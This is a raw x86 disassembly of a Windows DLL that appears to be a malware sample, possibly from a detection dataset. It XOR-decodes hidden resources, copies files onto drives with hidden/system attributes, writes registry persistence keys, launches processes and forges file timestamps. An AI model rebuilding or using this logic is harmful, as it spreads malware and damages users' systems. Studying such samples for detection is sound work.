sub_10001000
mov eax [ esp + 0x4 ]
push esi
or esi 0xffffffff
test eax eax
je r-xdata
mov eax esi
pop esi
retn
cmp [ eax + 0x1a ] 0x0
je r-xdata
push [ eax + 0x299 ]
add eax 0x29d
push eax
push 0x3
push 0x0
push rw-data
push [ esp + 0x20 ]
call [ RegSetValueExA@IAT ]
test eax eax
jne r-xdata
xor esi esi
sub_1000103b
push esi
mov esi [ esp + 0xc ]
push edi
or edi 0xffffffff
push [ esp + 0x14 ]
push 0x0
push esi
call memset
add esp 0xc
push [ esp + 0x14 ]
push esi
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
retn
push rw-data
push esi
call strcat
push [ esp + 0x14 ]
push esi
call strcat
add esp 0x10
xor edi edi
sub_100010a1
push ebp
mov ebp esp
mov eax 0x10b58
call sub_1000d330
and [ ebp - 0x240 ] 0x0
push esi
push edi
push 0x41
pop ecx
xor eax eax
and [ ebp - 0x348 ] al
lea edi [ ebp - 0x23f ]
[ edi ]
push 0x41
lea edi [ ebp - 0x347 ]
pop ecx
mov [ ebp - 0x138 ] 0x99
[ edi ]
push 0x40
lea edi [ ebp - 0x135 ]
pop ecx
mov [ ebp - 0x137 ] 0x3a
mov [ ebp - 0x136 ] 0x5c
and [ ebp - 0x20 ] 0x0
[ edi ]
stosw [ edi ]
xor eax eax
lea edi [ ebp - 0x1f ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
and [ ebp - 0x30 ] 0x0
and [ ebp - 0x10 ] 0x0
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0x2f ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0xf ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
and [ ebp - 0x10b58 ] 0x0
mov ecx 0x4203
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0x10b57 ]
[ edi ]
mov esi [ ebp + 0x8 ]
stosw [ edi ]
test esi esi
stosb [ edi ]
jne r-xdata
lea eax [ ebp - 0x240 ]
push 0x105
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
lea eax [ esi + 0x160 ]
push 0x10
push eax
lea eax [ ebp - 0x20 ]
push eax
call memcpy
lea eax [ esi + 0x170 ]
push 0x10
push eax
lea eax [ ebp - 0x10 ]
push eax
call memcpy
add esi 0x150
push 0x10
lea eax [ ebp - 0x30 ]
push esi
push eax
call memcpy
lea eax [ ebp - 0x240 ]
push rw-data
push eax
call strcat
mov esi 0x104
lea eax [ ebp - 0x240 ]
push esi
push eax
lea eax [ ebp - 0x348 ]
push eax
call [ strncpy@IAT ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x240 ]
push eax
call strcat
add esp 0x40
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x348 ]
push eax
call strcat
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x240 ]
push eax
call [ strstr@IAT ]
mov edi eax
mov al [ ebp + 0xc ]
add esp 0x10
dec edi
mov [ ebp - 0x138 ] al
lea ebx [ ebp - 0x10a54 ]
mov [ ebp + 0xc ] 0x7
call [ GetLastError@IAT ]
jmp r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x240 ]
push esi
push eax
lea eax [ ebx - 0x104 ]
push eax
call memcpy
lea eax [ ebp - 0x10 ]
push esi
push eax
lea eax [ ebp - 0x136 ]
push eax
call memcpy
lea eax [ ebp - 0x138 ]
push esi
push eax
push ebx
call memcpy
add esp 0x24
inc [ ebp - 0xd ]
inc [ edi ]
add ebx 0x208
dec [ ebp + 0xc ]
jne r-xdata
lea eax [ ebp - 0x348 ]
push esi
push eax
lea eax [ ebp - 0xfd20 ]
push eax
call memcpy
lea eax [ ebp - 0x30 ]
push esi
push eax
lea eax [ ebp - 0x136 ]
push eax
call memcpy
lea eax [ ebp - 0x138 ]
push esi
push eax
lea eax [ ebp - 0xfc1c ]
push eax
call memcpy
mov edi [ CopyFileA@IAT ]
add esp 0x24
lea esi [ ebp - 0x10a54 ]
push 0x8
pop ebx
lea eax [ esi - 0x104 ]
push eax
push esi
lea eax [ esi - 0x104 ]
push esi
push eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x3
push 0x0
jne r-xdata
lea eax [ ebp - 0x138 ]
push 0x6
push eax
call [ SetFileAttributesA@IAT ]
xor eax eax
pop ebx
call edi
add esi 0x208
dec ebx
jne r-xdata
sub_100012f0
push ebp
mov ebp esp
mov eax 0x10b58
call sub_1000d330
push esi
push edi
push 0x41
xor edx edx
pop ecx
xor eax eax
lea edi [ ebp - 0x137 ]
mov [ ebp - 0x138 ] dl
[ edi ]
push 0x41
lea edi [ ebp - 0x347 ]
pop ecx
mov [ ebp - 0x348 ] dl
[ edi ]
push 0x40
lea edi [ ebp - 0x23d ]
pop ecx
mov [ ebp - 0x240 ] 0x99
mov [ ebp - 0x23f ] 0x3a
mov [ ebp - 0x23e ] 0x5c
[ edi ]
stosw [ edi ]
xor eax eax
lea edi [ ebp - 0x1f ]
mov [ ebp - 0x20 ] dl
mov [ ebp - 0x30 ] dl
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0x2f ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0xf ]
mov [ ebp - 0x10 ] dl
mov ecx 0x4203
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0x10b57 ]
mov [ ebp - 0x10b58 ] dl
mov esi [ ebp + 0x8 ]
[ edi ]
stosw [ edi ]
cmp esi edx
stosb [ edi ]
jne r-xdata
lea eax [ ebp - 0x138 ]
push 0x105
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
lea eax [ esi + 0x160 ]
push 0x10
push eax
lea eax [ ebp - 0x20 ]
push eax
call memcpy
lea eax [ esi + 0x170 ]
push 0x10
push eax
lea eax [ ebp - 0x10 ]
push eax
call memcpy
add esi 0x150
push 0x10
lea eax [ ebp - 0x30 ]
push esi
push eax
call memcpy
lea eax [ ebp - 0x138 ]
push rw-data
push eax
call strcat
mov esi 0x104
lea eax [ ebp - 0x138 ]
push esi
push eax
lea eax [ ebp - 0x348 ]
push eax
call [ strncpy@IAT ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call strcat
add esp 0x40
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x348 ]
push eax
call strcat
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call [ strstr@IAT ]
mov edi eax
mov al [ ebp + 0xc ]
add esp 0x10
dec edi
mov [ ebp - 0x240 ] al
lea ebx [ ebp - 0x10b58 ]
mov [ ebp + 0xc ] 0x7
call [ GetLastError@IAT ]
jmp r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x138 ]
push esi
push eax
push ebx
call memcpy
lea eax [ ebp - 0x10 ]
push esi
push eax
lea eax [ ebp - 0x23e ]
push eax
call memcpy
add esp 0x18
inc [ ebp - 0xd ]
inc [ edi ]
add ebx esi
dec [ ebp + 0xc ]
jne r-xdata
mov esi [ DeleteFileA@IAT ]
push 0x4
lea edi [ ebp - 0x10b58 ]
pop ebx
push edi
call esi
add edi 0x208
dec ebx
jne r-xdata
lea eax [ ebp - 0x348 ]
push eax
call esi
xor eax eax
pop ebx
ordinal_3
push ebp
mov ebp esp
sub esp 0x114
push ebx
lea eax [ ebp - 0x4 ]
push esi
xor ebx ebx
push eax
xor esi esi
mov [ ebp - 0x4 ] ebx
call sub_100015f7
test eax eax
pop ecx
jne r-xdata
mov eax esi
pop esi
pop ebx
leave
retn
cmp [ rw-data ] bl
mov eax [ ebp - 0x4 ]
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
movzx ecx [ eax + 0x1a ]
mov [ rw-data ] ecx
mov [ rw-data ] 0x1
push 0x3
push [ ebp + 0x8 ]
push eax
call sub_100010a1
add esp 0xc
dec [ rw-data ]
mov esi eax
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x20 ] bl
je r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call sub_100012f0
pop ecx
pop ecx
mov al [ rw-data ]
push edi
mov [ ebp - 0x8 ] al
xor eax eax
lea edi [ ebp - 0x7 ]
push 0x40
stosw [ edi ]
pop ecx
lea edi [ ebp - 0x113 ]
mov [ ebp - 0x114 ] bl
or [ ebp - 0x10 ] 0xffffffff
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x114 ]
push 0x104
add edx 0x21
push eax
push edx
call sub_1000103b
add esp 0xc
lea eax [ ebp - 0x114 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0xf003f
push ebx
push ebx
add eax 0x31
push ebx
push eax
push 0x80000002
call [ RegCreateKeyExA@IAT ]
mov esi eax
pop edi
cmp esi ebx
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
call strlen
pop ecx
inc eax
push eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push 0x1
add eax 0x130
push ebx
push eax
push [ ebp - 0xc ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
sub_100015f7
push ebx
push ebp
push esi
push edi
push rw-data
push 0x65
push [ rw-data ]
or ebp 0xffffffff
call [ FindResourceA@IAT ]
mov esi eax
test esi esi
je r-xdata
call [ GetLastError@IAT ]
mov ebp eax
push esi
push [ rw-data ]
call [ LoadResource@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
push esi
push [ rw-data ]
call [ SizeofResource@IAT ]
mov edi eax
push edi
call [ malloc@IAT ]
mov esi [ esp + 0x18 ]
pop ecx
test eax eax
mov [ esi ] eax
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
push edi
push 0x0
push eax
call memset
add esp 0xc
push ebx
call [ LockResource@IAT ]
test eax eax
je r-xdata
push edi
push eax
push [ esi ]
call memcpy
mov ecx 0x62c
add esp 0xc
cmp edi ecx
jne r-xdata
mov esi [ esi ]
xor eax eax
xor [ esi + eax ] 0xcd
inc eax
cmp eax ecx
jb r-xdata
xor ebp ebp
jmp r-xdata
sub_10001697
push ebp
mov ebp esp
sub esp 0x104
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
leave
retn
and [ ebp - 0x104 ] 0x0
push 0x40
pop ecx
xor eax eax
lea edi [ ebp - 0x103 ]
push 0x2
push [ ebp + 0xc ]
[ edi ]
stosw [ edi ]
push esi
stosb [ edi ]
call sub_100010a1
mov edi eax
lea eax [ ebp - 0x104 ]
push 0x104
push eax
push esi
call sub_10001086
add esp 0x18
lea eax [ ebp - 0x104 ]
push 0x80
push eax
call [ SetFileAttributesA@IAT ]
cmp [ esi + 0x20 ] 0x0
je r-xdata
dec [ esi + 0x1a ]
lea eax [ ebp - 0x104 ]
push eax
push esi
call sub_10001723
inc [ esi + 0x1a ]
pop ecx
pop ecx
push [ ebp + 0xc ]
push esi
call sub_100017a0
pop ecx
pop ecx
sub_10001723
push ebx
push esi
xor esi esi
cmp [ esp + 0x10 ] esi
je r-xdata
or esi 0xffffffff
mov ebx [ esp + 0xc ]
cmp ebx esi
je r-xdata
push edi
xor eax eax
mov edi 0x62c
xor [ eax + ebx ] 0xcd
inc eax
cmp eax edi
jb r-xdata
push ebp
push esi
push [ esp + 0x1c ]
call [ BeginUpdateResourceA@IAT ]
mov ebp eax
cmp ebp esi
jne r-xdata
push edi
push ebx
push esi
push 0x65
push rw-data
push ebp
call [ UpdateResourceA@IAT ]
mov esi eax
push 0x0
neg esi
sbb esi esi
push ebp
and esi 0x2
dec esi
dec esi
call [ EndUpdateResourceA@IAT ]
test eax eax
jne r-xdata
or esi 0xffffffff
jmp r-xdata
xor eax eax
pop ebp
push 0xfffffffd
pop esi
xor [ eax + ebx ] 0xcd
inc eax
cmp eax edi
jb r-xdata
pop edi
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
sub_100017a0
push ebp
mov ebp esp
sub esp 0x424
push ebx
push esi
push edi
push 0x40
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x31f ]
mov [ ebp - 0x320 ] bl
push 0x40
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x21b ]
mov [ ebp - 0x21c ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x3f
xor eax eax
pop ecx
lea edi [ ebp - 0x117 ]
mov [ ebp - 0x118 ] bl
or [ ebp - 0x14 ] 0xffffffff
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x4 ]
push 0x3
push eax
lea eax [ ebp - 0x21c ]
push eax
mov [ ebp - 0x4 ] 0x99
mov [ ebp - 0x3 ] 0x3a
mov [ ebp - 0x2 ] 0x5c
mov [ ebp - 0x10 ] 0x100
mov [ ebp - 0x8 ] 0x1
call memcpy
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0x320 ]
push 0x104
push ecx
lea eax [ esi + 0x21 ]
push eax
mov [ ebp - 0x18 ] eax
call sub_1000103b
mov [ ebp + 0x8 ] eax
mov al [ ebp + 0xc ]
mov [ ebp - 0x21c ] al
lea eax [ esi + 0x150 ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call strcat
add esp 0x20
lea eax [ ebp - 0x320 ]
push ebx
push eax
lea eax [ ebp - 0x21c ]
push eax
call [ CopyFileA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push ebx
push 0xf003f
push ebx
push ebx
lea eax [ esi + 0x31 ]
push ebx
push eax
push 0x80000002
call [ RegCreateKeyExA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
jne r-xdata
lea eax [ ebp - 0x10 ]
add esi 0x130
push eax
lea eax [ ebp - 0x118 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push ebx
push esi
push [ ebp - 0xc ]
call [ RegQueryValueExA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x423 ]
mov [ ebp - 0x424 ] bl
push 0x100
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x118 ]
push ebx
push eax
call memset
lea eax [ ebp - 0x118 ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x424 ]
push 0x104
push eax
push [ ebp - 0x18 ]
call sub_1000103b
add esp 0x20
test eax eax
jne r-xdata
lea eax [ ebp - 0x424 ]
push eax
lea eax [ ebp - 0x118 ]
push eax
call strcat
lea eax [ ebp - 0x118 ]
mov [ ebp - 0x8 ] 0x3
push eax
call strlen
add esp 0xc
inc eax
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0x118 ]
push eax
push [ ebp - 0x8 ]
push ebx
push esi
push [ ebp - 0xc ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0xc ]
mov [ ebp + 0x8 ] eax
call [ RegCloseKey@IAT ]
sub_1000197b
push ebp
mov ebp esp
sub esp 0x228
push esi
mov esi [ ebp + 0x8 ]
or eax 0xffffffff
test esi esi
je r-xdata
pop esi
leave
retn
and [ ebp - 0x228 ] 0x0
push edi
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x227 ]
[ edi ]
and [ ebp - 0x124 ] 0x0
push 0x40
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x123 ]
push 0x7
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x1e ]
mov [ ebp - 0x1f ] 0x3a
[ edi ]
stosw [ edi ]
mov al [ ebp + 0xc ]
push 0x104
mov [ ebp - 0x20 ] al
lea eax [ ebp - 0x228 ]
push eax
push esi
call sub_10001086
push rw-data
call strlen
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x124 ]
push eax
call [ strncpy@IAT ]
add esi 0x150
lea eax [ ebp - 0x124 ]
push esi
push eax
call strcat
add esp 0x24
lea eax [ ebp - 0x124 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x124 ]
push 0x0
push eax
lea eax [ ebp - 0x228 ]
push eax
call [ CopyFileA@IAT ]
lea eax [ ebp - 0x124 ]
push 0x6
push eax
call [ SetFileAttributesA@IAT ]
xor eax eax
pop edi
sub_10001a54
push ebp
mov ebp esp
sub esp 0x158
mov al [ rw-data ]
push esi
push edi
push 0x40
mov [ ebp - 0x158 ] al
pop ecx
xor eax eax
lea edi [ ebp - 0x157 ]
[ edi ]
stosw [ edi ]
xor esi esi
cmp [ ebp + 0x8 ] esi
stosb [ edi ]
je r-xdata
mov eax esi
pop edi
pop esi
leave
retn
push 0x44
lea eax [ ebp - 0x54 ]
push esi
push eax
call memset
push 0x10
lea eax [ ebp - 0x10 ]
push esi
push eax
call memset
mov edi 0x104
lea eax [ ebp - 0x158 ]
push edi
push esi
push eax
call memset
add esp 0x24
lea eax [ ebp - 0x158 ]
mov [ ebp - 0x54 ] 0x44
push edi
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x158 ]
push rw-data
push eax
call strcat
mov eax [ ebp + 0x8 ]
add eax 0x9
push eax
lea eax [ ebp - 0x158 ]
push eax
call strcat
lea eax [ ebp - 0x158 ]
push eax
call sub_10001b34
add esp 0x14
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x24 ] si
push eax
lea eax [ ebp - 0x54 ]
push eax
push esi
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x158 ]
push esi
push eax
push esi
call [ CreateProcessA@IAT ]
mov esi [ ebp - 0x8 ]
sub_10001b34
push ebp
mov ebp esp
sub esp 0x24
push ebx
or [ ebp - 0x4 ] 0xffffffff
push esi
push edi
push rw-data
push 0x66
push [ rw-data ]
call [ FindResourceA@IAT ]
mov esi eax
xor ebx ebx
cmp esi ebx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
push esi
push [ rw-data ]
call [ LoadResource@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push esi
push [ rw-data ]
call [ SizeofResource@IAT ]
push edi
mov [ ebp - 0x8 ] eax
call [ LockResource@IAT ]
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov edi 0x80
push ebx
mov esi [ CreateFileA@IAT ]
push edi
push 0x2
push ebx
push 0x1
push 0xc0000000
push [ ebp + 0x8 ]
call esi
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
lea ecx [ ebp - 0xc ]
push ebx
push ecx
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push eax
call [ WriteFile@IAT ]
mov eax [ ebp - 0x8 ]
cmp [ ebp - 0xc ] eax
jne r-xdata
push ebx
push edi
push 0x3
push ebx
push 0x1
push 0x80000000
push rw-data
call esi
mov edi [ CloseHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
call edi
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push esi
call [ GetFileTime@IAT ]
test eax eax
je r-xdata
push esi
call edi
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push [ ebp + 0x8 ]
call [ SetFileTime@IAT ]
sub_10001c3f
push ebp
mov ebp esp
sub esp 0x10
push ebx
push edi
xor eax eax
lea edi [ ebp - 0xe ]
mov [ ebp - 0x10 ] 0x99
mov [ ebp - 0xf ] 0x3a
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
mov al [ ebp + 0xc ]
mov bl 0x64
test al al
je r-xdata
pop edi
xor eax eax
pop ebx
leave
retn
mov [ ebp - 0x10 ] al
mov eax [ ebp + 0x8 ]
add eax 0x170
push esi
push eax
lea eax [ ebp - 0x10 ]
push eax
call strcat
pop ecx
mov [ ebp - 0xb ] bl
pop ecx
push 0x7
pop esi
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
call [ SetFileAttributesA@IAT ]
inc bl
dec esi
mov [ ebp - 0xb ] bl
jne r-xdata
pop esi
ordinal_4
push ebp
mov ebp esp
sub esp 0x214
push ebx
push esi
xor ebx ebx
push edi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] 0x1
call sub_10001f0c
mov [ ebp - 0x8 ] al
lea eax [ ebp - 0x4 ]
push eax
call sub_100015f7
test eax eax
pop ecx
jne r-xdata
xor eax eax
push 0x40
lea edi [ ebp - 0x10f ]
pop ecx
mov [ ebp - 0x110 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov esi 0x104
lea eax [ ebp - 0x110 ]
push esi
push eax
push [ rw-data ]
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ strstr@IAT ]
add eax 0x150
push eax
lea eax [ ebp - 0x110 ]
push eax
call edi
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] bl
je r-xdata
cmp [ ebp - 0x8 ] bl
je r-xdata
cmp [ eax + 0x298 ] bl
jne r-xdata
add eax 0x22
push eax
lea eax [ ebp - 0x110 ]
push eax
call edi
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a ] 0x1
jbe r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_10001697
pop ecx
pop ecx
push eax
call sub_100027d4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
pop ecx
cmp [ eax + 0x322 ] bl
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x8 ] bl
jne r-xdata
push esi
lea eax [ ebp - 0x110 ]
push ebx
push eax
call memset
lea eax [ ebp - 0x110 ]
push esi
push eax
mov eax [ ebp - 0x4 ]
add eax 0x160
push eax
call sub_1000103b
add esp 0x18
lea eax [ ebp - 0x110 ]
push eax
call [ LoadLibraryA@IAT ]
cmp eax ebx
je r-xdata
push 0x6
push [ ebp - 0x8 ]
push eax
call sub_10001c3f
add esp 0xc
push [ ebp - 0x8 ]
call sub_10001fda
cmp cl bl
je r-xdata
mov cl [ eax + 0x1a ]
cmp cl 0x1
je r-xdata
cmp [ ebp + 0x8 ] 0x27
jne r-xdata
push 0x4
push eax
mov [ ebp + 0x8 ] ebx
call [ GetProcAddress@IAT ]
lea ecx [ ebp + 0x8 ]
push ecx
push ebx
push 0x28
push eax
push ebx
push ebx
call [ CreateThread@IAT ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_10001a54
test eax eax
pop ecx
je r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
push [ ebp - 0x8 ]
push eax
call sub_1000197b
pop ecx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] ebx
push eax
lea eax [ ebp + 0x8 ]
push eax
push ebx
push 0xf003f
push ebx
push ebx
push ebx
push rw-data
push 0x80000002
mov [ ebp - 0xc ] ebx
call [ RegCreateKeyExA@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x213 ]
mov [ ebp - 0x214 ] bl
push esi
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x214 ]
push ebx
push eax
call memset
add esp 0xc
push 0x7d0
call [ Sleep@IAT ]
lea eax [ ebp - 0x214 ]
push esi
push eax
push rw-data
call sub_1000103b
add esp 0xc
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call sub_1000202a
pop ecx
mov [ eax + 0x19 ] bl
mov eax [ ebp - 0x4 ]
pop ecx
cmp [ eax + 0x298 ] bl
je r-xdata
mov eax esi
jmp r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call sub_10001000
pop ecx
pop ecx
push [ ebp + 0x8 ]
call [ RegCloseKey@IAT ]
push 0x80
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_10001c3f
add esp 0xc
cmp [ ebp - 0xc ] ebx
jne r-xdata
lea eax [ ebp - 0x214 ]
push eax
call [ LoadLibraryA@IAT ]
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x4 ]
call sub_100022a2
sub_10001f0c
push ebp
mov ebp esp
sub esp 0x560
push ebx
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x20 ]
mov eax [ rw-data ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0x7f
mov [ ebp - 0x4 ] eax
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x55f ]
mov [ ebp - 0x560 ] bl
push 0x7f
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x35f ]
mov [ ebp - 0x360 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x140
lea eax [ ebp - 0x160 ]
push ebx
push eax
call memset
add esp 0xc
mov [ ebp - 0x4 ] 0x64
mov esi 0x200
inc [ ebp - 0x4 ]
inc ebx
cmp ebx 0x16
jbe r-xdata
mov al [ ebp - 0x4 ]
mov [ ebp - 0x20 ] al
lea eax [ ebp - 0x160 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebp - 0x360 ]
push esi
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x560 ]
push esi
push eax
lea eax [ ebp - 0x4 ]
push eax
call [ GetVolumeInformationA@IAT ]
test eax eax
je r-xdata
xor al al
push eax
call [ FindClose@IAT ]
mov al [ ebp - 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10001fda
push ebp
mov ebp esp
sub esp 0x20
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
mov al [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
test al al
movsb [ edi ] [ esi ]
je r-xdata
pop edi
pop esi
leave
retn
mov esi [ DeleteFileA@IAT ]
push 0x7
mov [ ebp - 0x10 ] al
mov [ ebp - 0x20 ] al
mov [ ebp - 0xb ] 0x64
pop edi
lea eax [ ebp - 0x10 ]
push eax
call esi
inc [ ebp - 0xb ]
dec edi
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
call esi
sub_1000202a
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
or [ ebp - 0xc ] 0xffffffff
or [ ebp - 0x8 ] 0xffffffff
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] 0x8
cmp eax ebx
mov [ ebp - 0x1c ] ebx
je r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x19
mov [ ebp - 0x18 ] eax
mov al [ eax ]
cmp al 0xff
jne r-xdata
xor ecx ecx
cmp al bl
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push 0xf003f
push ebx
setne cl
push ebx
push ebx
inc ecx
push rw-data
push 0x80000002
mov [ ebp - 0x10 ] ecx
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
push esi
lea eax [ ebp - 0x10 ]
mov esi [ RegSetValueExA@IAT ]
push 0x4
push eax
push 0x3
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_10001000
pop ecx
test eax eax
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
leave
retn
push 0x1
push [ ebp - 0x18 ]
push 0x3
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
lea eax [ ebp - 0x1c ]
push 0x4
push eax
push 0x3
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
test eax eax
pop esi
jne r-xdata
lea eax [ ebp - 0x14 ]
push 0x4
push eax
push 0x3
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
mov [ ebp - 0x8 ] ebx
sub_10002109
push ebp
mov ebp esp
sub esp 0x104
and [ ebp - 0x104 ] 0x0
push edi
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x103 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ ebp + 0x8 ]
pop edi
